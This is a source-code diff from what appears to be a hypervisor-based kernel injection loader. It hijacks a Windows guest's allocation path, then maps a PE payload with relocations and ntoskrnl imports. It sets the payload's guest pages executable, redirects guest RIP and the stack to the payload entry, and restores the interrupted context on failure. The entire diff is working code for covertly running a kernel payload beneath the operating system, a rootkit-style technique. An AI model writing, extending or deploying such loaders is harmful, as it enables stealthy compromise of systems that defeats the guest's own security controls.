@@ -291,7 +291,7 @@ bool prepare_allocation_hijack(context_t* ctx, void* trap_frame_ptr)
     tf->rcx = image_size;                 // NumberOfBytes (Virtual Size)
     tf->rdx = 0xFFFFFFFF;                 // Node (Current)
     tf->r8 = 0;                           // AllocationType (Normal)
-    tf->r9 = 0x40;                        // Protect (PAGE_EXECUTE_READWRITE)
+    tf->r9 = 0x20;                        // Protect (PAGE_EXECUTE_READ)
 
     // 4. Setup Stack (Shadow Space + Return Address)
     // We need to write to Guest Stack. We need to map Guest RSP to Host VA.
@@ -324,6 +324,27 @@ bool prepare_allocation_hijack(context_t* ctx, void* trap_frame_ptr)
     // So: Align guest RSP down to 16, then subtract 0x28.
     // 0x20 (Shadow) + 0x8 (RetAddr) = 0x28.
     const uint64_t new_rsp = aligned_base_rsp - 0x28;
+    const uint64_t required_stack = 0x200;
+    if (new_rsp < required_stack) {
+        logs::print(ctx->log_ctx, "[Injection] ERROR: Guest RSP too low for hijack. RSP=%p NewRSP=%p\n", guest_rsp, new_rsp);
+        return false;
+    }
+
+    const uint64_t probe_start = (new_rsp - required_stack) & ~0xFFFull;
+    const uint64_t probe_end = ((new_rsp + 0x20) & ~0xFFFull) + 0x1000;
+    for (uint64_t probe = probe_start; probe < probe_end; probe += 0x1000) {
+        virtual_address_t gva_probe = {};
+        gva_probe.address = probe;
+        const uint64_t probe_pa = memory_manager::translate_guest_virtual_address(
+            arch::get_guest_cr3(),
+            slat::hyperv_cr3(&g_runtime_context.slat_ctx),
+            gva_probe
+        );
+        if (probe_pa == 0) {
+            logs::print(ctx->log_ctx, "[Injection] ERROR: Guest stack guard reached. RSP=%p NewRSP=%p Probe=%p\n", guest_rsp, new_rsp, probe);
+            return false;
+        }
+    }
 
     // Translate new_rsp to Host PA/VA
     virtual_address_t gva_rsp = {};
@@ -388,30 +409,21 @@ bool harvest_allocation_result(context_t* ctx, void* trap_frame_ptr)
 
     logs::print(ctx->log_ctx, "[Injection] Stage 2: Allocation captured. Base=0x%p Size=0x%X\n", allocated_base, image_size);
 
-    // 2. Restore Context
-    // We only restore non-volatile registers and control registers?
-    // Actually, we should restore everything to be safe, as if the hijack never happened.
-    // BUT, we must preserve the Guest's state changes IF they were relevant?
-    // No, we want to resume the ORIGINAL interrupted flow transparently.
-    crt::copy_memory(tf, &inject_ctx.saved_guest_context, sizeof(trap_frame_t));
-
-    // Update VMCS to match restored context
-    arch::set_guest_rsp(tf->rsp);
-    arch::set_guest_rip(inject_ctx.saved_rip); // Restore original RIP
-
-    // Disable #PF Interception
-    uint64_t exception_bitmap = 0;
-    __vmx_vmread(VMCS_CTRL_EXCEPTION_BITMAP, &exception_bitmap);
-    exception_bitmap &= ~(1ULL << 14); // Disable #PF
-    __vmx_vmwrite(VMCS_CTRL_EXCEPTION_BITMAP, exception_bitmap);
-
-    logs::print(ctx->log_ctx, "[Injection] Stage 2: Context restored. Disabled #PF trap. Resuming original flow.\n");
     return true;
 }
 
 bool execute_payload_hijack(context_t* ctx, void* trap_frame_ptr)
 {
+    trap_frame_t* tf = reinterpret_cast<trap_frame_t*>(trap_frame_ptr);
     auto& inject_ctx = g_runtime_context.injection_ctx;
+    bool success = true;
+    uint64_t entry_va = 0;
+    bool handoff_to_payload = false;
+    uint64_t payload_rsp = 0;
+    virtual_address_t payload_rsp_va = {};
+    uint64_t payload_rsp_pa = 0;
+    void* host_stack_ptr = nullptr;
+    uint64_t exception_bitmap = 0;
 
     // 1. Get Image Info
     const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::rwbase_image);
@@ -425,18 +437,21 @@ bool execute_payload_hijack(context_t* ctx, void* trap_frame_ptr)
     allocation_info_t alloc = {};
     if (!allocate_guest_memory(ctx, image_size, &alloc)) {
         logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to allocate Guest memory for RWbase\n");
-        return false;
+        success = false;
+        goto restore_context;
     }
 
     crt::set_memory(alloc.vmm_mapped_address, 0, image_size);
     if (!map_sections(alloc.vmm_mapped_address, payload::rwbase_image, payload::rwbase_image_size)) {
         logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map sections\n");
-        return false;
+        success = false;
+        goto restore_context;
     }
 
     if (target_va == 0) {
         logs::print(ctx->log_ctx, "[Injection] ERROR: Payload Guest VA not initialized\n");
-        return false;
+        success = false;
+        goto restore_context;
     }
     inject_ctx.allocated_buffer = target_va;
 
@@ -448,13 +463,15 @@ bool execute_payload_hijack(context_t* ctx, void* trap_frame_ptr)
     // 5. Apply Relocations
     if (!apply_relocations(ctx, alloc.vmm_mapped_address, target_va)) {
         logs::print(ctx->log_ctx, "[Injection] ERROR: Relocation failed\n");
-        return false;
+        success = false;
+        goto restore_context;
     }
 
     // 6. Resolve Imports
     if (!resolve_payload_imports(ctx, alloc.vmm_mapped_address, g_runtime_context.ntoskrnl_base)) {
         logs::print(ctx->log_ctx, "[Injection] ERROR: Import resolution failed\n");
-        return false;
+        success = false;
+        goto restore_context;
     }
 
     ctx->guest_cr3 = arch::get_guest_cr3();
@@ -462,22 +479,74 @@ bool execute_payload_hijack(context_t* ctx, void* trap_frame_ptr)
 
     if (!map_payload_pages_to_guest(ctx, alloc, target_va)) {
         logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map payload into Guest via SLAT\n");
-        return false;
+        success = false;
+        goto restore_context;
     }
 
-    // 9. Set RIP to EntryPoint
-    const uint64_t entry_va = target_va + nt->optional_header.address_of_entry_point;
+    // 业务说明：修正来宾页表权限以保证代码可执行。
+    // 输入：guest_cr3/slat_cr3/target_va/image_size；输出：权限更新；规则：失败则终止注入；异常：不抛出。
+    if (!memory_manager::set_guest_page_permissions(ctx->guest_cr3, ctx->slat_cr3, target_va, 0, image_size, true, true, true)) {
+        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to update guest PTE permissions\n");
+        success = false;
+        goto restore_context;
+    }
+
+
+    entry_va = target_va + nt->optional_header.address_of_entry_point;
     inject_ctx.payload_guest_base.store(target_va);
     inject_ctx.payload_entry.store(entry_va);
 
+    payload_rsp = inject_ctx.saved_guest_context.rsp;
+    payload_rsp &= ~0xFULL;
+    payload_rsp -= 0x28;
+    payload_rsp_va.address = payload_rsp;
+    payload_rsp_pa = memory_manager::translate_guest_virtual_address(ctx->guest_cr3, ctx->slat_cr3, payload_rsp_va);
+    if (!payload_rsp_pa) {
+        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to translate Guest RSP\n");
+        success = false;
+        goto restore_context;
+    }
+
+    host_stack_ptr = memory_manager::map_guest_physical(ctx->slat_cr3, payload_rsp_pa);
+    if (!host_stack_ptr) {
+        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map Guest Stack\n");
+        success = false;
+        goto restore_context;
+    }
+
+    *reinterpret_cast<uint64_t*>(host_stack_ptr) = injection_ctx_t::MAGIC_TRAP_RIP;
+
     slat::flush_current_logical_processor_cache(1);
     arch::set_guest_rip(entry_va);
-    
-    // 10. Clear TF (Trap Flag)
-    arch::set_guest_rflags(arch::get_guest_rflags() & ~0x100); // Clear TF (Bit 8)
+    arch::set_guest_rsp(payload_rsp);
 
-    logs::print(ctx->log_ctx, "[Injection] Stage 3: Payload deployed. Hijacking RIP to 0x%p\n", entry_va);
-    return true;
+    __vmx_vmread(VMCS_CTRL_EXCEPTION_BITMAP, &exception_bitmap);
+    exception_bitmap |= (1ULL << 14);
+    __vmx_vmwrite(VMCS_CTRL_EXCEPTION_BITMAP, exception_bitmap);
+
+    inject_ctx.stage.store(3);
+    handoff_to_payload = true;
+
+
+    arch::set_guest_rflags(arch::get_guest_rflags() & ~0x100);
+    if (handoff_to_payload) {
+        logs::print(ctx->log_ctx, "[Injection] Stage 3: Payload deployed. Entry hijack armed.\n");
+        return true;
+    }
+    logs::print(ctx->log_ctx, "[Injection] Stage 3: Payload deployed. Entry hijack skipped.\n");
+
+restore_context:
+    crt::copy_memory(tf, &inject_ctx.saved_guest_context, sizeof(trap_frame_t));
+    arch::set_guest_rsp(tf->rsp);
+    arch::set_guest_rip(inject_ctx.saved_rip);
+
+    __vmx_vmread(VMCS_CTRL_EXCEPTION_BITMAP, &exception_bitmap);
+    exception_bitmap &= ~(1ULL << 14);
+    __vmx_vmwrite(VMCS_CTRL_EXCEPTION_BITMAP, exception_bitmap);
+
+    logs::print(ctx->log_ctx, "[Injection] Stage 3: Context restored. Disabled #PF trap. Resuming original flow.\n");
+    inject_ctx.stage.store(2);
+    return success;
 }
 
 } // namespace loader
